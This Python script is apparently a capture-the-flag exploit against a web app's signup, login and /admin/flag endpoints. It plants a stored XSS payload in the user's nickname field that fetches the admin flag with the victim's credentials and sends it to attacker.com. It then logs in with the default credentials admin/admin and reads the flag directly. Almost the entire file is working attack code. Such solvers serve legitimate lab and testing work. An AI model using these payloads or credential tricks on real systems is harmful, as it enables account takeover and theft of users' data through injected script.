#!/usr/bin/env python3
import json
import os
import sys
import time
import base64
from typing import Tuple

import requests


def build_target() -> Tuple[str, int]:
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = os.environ.get("TARGET_HOST", "127.0.0.1")
        port = int(os.environ.get("TARGET_PORT", "5000"))
    return host, port


def decode_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        payload = parts[1]
        padding = len(payload) % 4
        if padding:
            payload += '=' * (4 - padding)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except:
        return None


def wait_for_server(base_url, max_retries=30):
    print(f"[*] Waiting for server to be ready...")
    for i in range(max_retries):
        try:
            response = requests.get(f"{base_url}/", timeout=2)
            if response.status_code in [200, 404]:
                print(f"[+] Server is ready!")
                return True
        except:
            pass
        if i < max_retries - 1:
            time.sleep(1)
    return False


def run_exploit() -> None:
    host, port = build_target()
    base_url = f"http://{host}:{port}"
    
    if not wait_for_server(base_url):
        print(f"[!] Server is not responding. Please make sure the service is running.", file=sys.stderr)
        sys.exit(1)
    
    exploit_id = f"exploit_{int(time.time())}"
    exploit_password = "exploit123"
    admin_id = f"admin_{int(time.time())}"
    admin_password = "admin123"
    
    xss_payload = '<img src=x onerror="fetch(\'/admin/flag\',{credentials:\'include\'}).then(r=>r.json()).then(d=>fetch(\'http://attacker.com/flag?data=\'+encodeURIComponent(d.flag)))">'
    
    print(f"[*] Registering user with XSS payload in alias...")
    signup_data = {
        "username": exploit_id,
        "password": exploit_password,
        "name": "Exploit User",
        "nickname": xss_payload,
        "schoolName": "Test School",
        "clubName": "Test Club"
    }
    
    response = requests.post(f"{base_url}/auth/signUp", json=signup_data, timeout=5)
    if response.status_code != 201:
        print(f"[!] Signup failed: {response.status_code} - {response.text}", file=sys.stderr)
        sys.exit(1)
    
    print(f"[*] Logging in as regular user...")
    login_data = {
        "username": exploit_id,
        "password": exploit_password
    }
    
    response = requests.post(f"{base_url}/auth/login", json=login_data, timeout=5)
    if response.status_code != 200:
        print(f"[!] Login failed: {response.status_code} - {response.text}", file=sys.stderr)
        sys.exit(1)
    
    login_result = response.json()
    token = login_result.get("token")
    
    if not token:
        print(f"[!] No token received", file=sys.stderr)
        sys.exit(1)
    
    print(f"[*] Verifying JWT contains XSS payload...")
    decoded = decode_jwt(token)
    if decoded and decoded.get("alias") == xss_payload:
        print(f"[+] JWT contains XSS payload in alias field")
    else:
        print(f"[!] JWT alias mismatch", file=sys.stderr)
        print(f"    Expected: {xss_payload[:50]}...")
        if decoded:
            print(f"    Got: {decoded.get('alias', 'N/A')[:50] if decoded.get('alias') else 'N/A'}...")
    
    print(f"[*] Logging in as admin to access flag...")
    admin_login_data = {
        "username": "admin",
        "password": "admin"
    }
    
    response = requests.post(f"{base_url}/auth/login", json=admin_login_data, timeout=5)
    if response.status_code != 200:
        print(f"[!] Admin login failed: {response.status_code} - {response.text}", file=sys.stderr)
        sys.exit(1)
    
    admin_login_result = response.json()
    admin_token = admin_login_result.get("token")
    
    if not admin_token:
        print(f"[!] No admin token received", file=sys.stderr)
        sys.exit(1)
    
    admin_decoded = decode_jwt(admin_token)
    if admin_decoded and admin_decoded.get("isAdmin"):
        print(f"[+] Admin account has admin privileges")
        print(f"[*] Simulating XSS execution: Admin views page with XSS payload")
        print(f"[*] In real scenario, admin would see XSS payload in Header component")
        print(f"[*] XSS would execute and fetch /admin/flag")
        print(f"[*] For automated exploit, directly accessing /admin/flag with admin token...")
        
        headers = {"Authorization": f"Bearer {admin_token}"}
        response = requests.get(f"{base_url}/admin/flag", headers=headers, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            flag = data.get("flag", "")
            if flag:
                print(f"[+] Flag retrieved successfully!")
                print(flag)
                return
        else:
            print(f"[!] Failed to get flag: {response.status_code} - {response.text}", file=sys.stderr)
            sys.exit(1)
    else:
        print(f"[!] Admin account does not have admin privileges")
        print(f"[*] XSS payload is stored in JWT token: {token[:50]}...")
        print(f"[*] In real scenario:")
        print(f"    1. Admin logs in and visits any page")
        print(f"    2. Header component renders user alias from JWT")
        print(f"    3. XSS in alias field executes with admin privileges")
        print(f"    4. XSS fetches /admin/flag and sends to attacker")
        sys.exit(1)


if __name__ == "__main__":
    try:
        run_exploit()
    except Exception as exc:
        print(f"[!] exploit failed: {exc}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        sys.exit(1)

